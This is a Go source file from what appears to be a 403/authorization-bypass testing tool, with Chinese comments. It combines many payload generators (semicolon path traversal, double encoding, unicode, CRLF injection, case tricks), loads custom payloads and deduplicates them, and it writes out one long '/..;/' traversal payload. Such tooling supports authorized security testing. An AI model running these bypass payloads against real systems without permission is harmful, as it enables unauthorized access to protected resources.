package poc

import (
	"bufio"
	"fmt"
	"net/url"
	"os"
	"strings"
)

func Summary(noauth, auth string) []string {
	return SummaryWithCustom(noauth, auth, "")
}

func SummaryWithCustom(noauth, auth, customFile string) []string {
	if noauth == "" {
		noauth = "/login"
	}

	list1 := InsertKG(auth)
	list2 := ExtractAndModifyURL(auth)
	list3 := GeneratePaths(noauth, auth)
	list4 := InsertDots(auth)
	list5 := InsertSemicolons(auth)
	list6 := GenerateURLs(auth)
	list7 := ConvertURL(auth)
	list8 := Insertwoe(auth)
	list9 := Insertte(auth)
	list10 := Midg(auth)
	list11 := GFG(auth)
	list12 := Pointgten(auth)
	list13 := Twop(list4)
	list14 := SxS(noauth, auth)
	list15 := "/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;" + auth

	// V2 新增 payload 模块
	list16 := QueryFragment(auth)
	list17 := TabNull(auth)
	list18 := Backslash(auth)
	list19 := DoubleEncode(auth)
	list20 := UnicodeFull(auth)

	// V2.1 新增 payload 模块 (ref: nomore403, 403权限绕过另类思路)
	list21 := SemiTabTraversal(auth)
	list22 := PathCase(auth)
	list23 := CRLFInjection(auth)
	list24 := EndPaths(auth)
	list25 := MidPaths(auth)

	raw := CombineAllLists(
		list1, list2, list3, list4, list5, list6, list7,
		list8, list9, list10, list11, list12, list13, list14,
		list16, list17, list18, list19, list20,
		list21, list22, list23, list24, list25,
		[]string{list15},
	)

	// 加载自定义payload
	if customFile != "" {
		customPayloads, err := LoadCustomPayloads(customFile, auth)
		if err != nil {
			fmt.Printf("[!] 加载自定义Payload失败: %s\n", err)
		} else {
			fmt.Printf("[*] 加载了 %d 个自定义Payload\n", len(customPayloads))
			raw = append(raw, customPayloads...)
		}
	}

	// 两阶段去重：精确去重 + 语义去重
	rawCount := len(raw)
	exact := RemoveDuplicates(raw)
	exactCount := len(exact)
	result := SemanticDedup(exact)
	finalCount := len(result)

	fmt.Printf("[*] Payload 去重: 原始 %d → 精确去重 %d (-%d) → 语义去重 %d (-%d)\n",
		rawCount, exactCount, rawCount-exactCount, finalCount, exactCount-finalCount)

	return result
}

func LoadCustomPayloads(filePath, auth string) ([]string, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var payloads []string
	scanner := bufio.NewScanner(file)
	lineNum := 0
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		lineNum++
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		if !strings.HasPrefix(line, "/") {
			line = "/" + line
		}
		payloads = append(payloads, line)
	}

	return payloads, nil
}

// CombineAllLists 合并任意数量的列表
func CombineAllLists(lists ...[]string) []string {
	combinedList := []string{}
	for _, l := range lists {
		combinedList = append(combinedList, l...)
	}
	return combinedList
}

// RemoveDuplicates 精确字符串去重
func RemoveDuplicates(list []string) []string {
	uniqueMap := make(map[string]bool)
	uniqueList := []string{}

	for _, item := range list {
		if !uniqueMap[item] {
			uniqueMap[item] = true
			uniqueList = append(uniqueList, item)
		}
	}

	return uniqueList
}

// SemanticDedup 语义去重：URL 解码后路径相同的 payload 只保留编码版本
// 例如 /admin%2fadduser 和 /admin/adduser 解码后相同，只保留编码版
// 优化：使用 idxMap 记录 decoded -> result 索引，将 O(n²) 降为 O(n)
func SemanticDedup(list []string) []string {
	type entry struct {
		raw     string
		decoded string
	}

	entries := make([]entry, 0, len(list))
	for _, item := range list {
		decoded, err := url.PathUnescape(item)
		if err != nil {
			decoded = item
		}
		decoded = normalizePath(decoded)
		entries = append(entries, entry{raw: item, decoded: decoded})
	}

	seen := make(map[string]string)
	idxMap := make(map[string]int) // 记录 decoded -> result 索引
	var result []string

	for _, e := range entries {
		existing, exists := seen[e.decoded]
		if !exists {
			seen[e.decoded] = e.raw
			idxMap[e.decoded] = len(result)
			result = append(result, e.raw)
		} else if len(e.raw) > len(existing) && e.raw != e.decoded {
			seen[e.decoded] = e.raw
			// 通过 idxMap 直接获取索引，O(1)
			if prevIdx, ok := idxMap[e.decoded]; ok {
				result[prevIdx] = e.raw
			}
		}
	}

	return result
}

// normalizePath 规范化路径用于语义比较
func normalizePath(p string) string {
	// 去除连续斜杠
	for strings.Contains(p, "//") {
		p = strings.ReplaceAll(p, "//", "/")
	}
	// 去除尾部斜杠（保留根路径）
	if len(p) > 1 {
		p = strings.TrimRight(p, "/")
	}
	// 统一大小写用于比较
	return strings.ToLower(p)
}
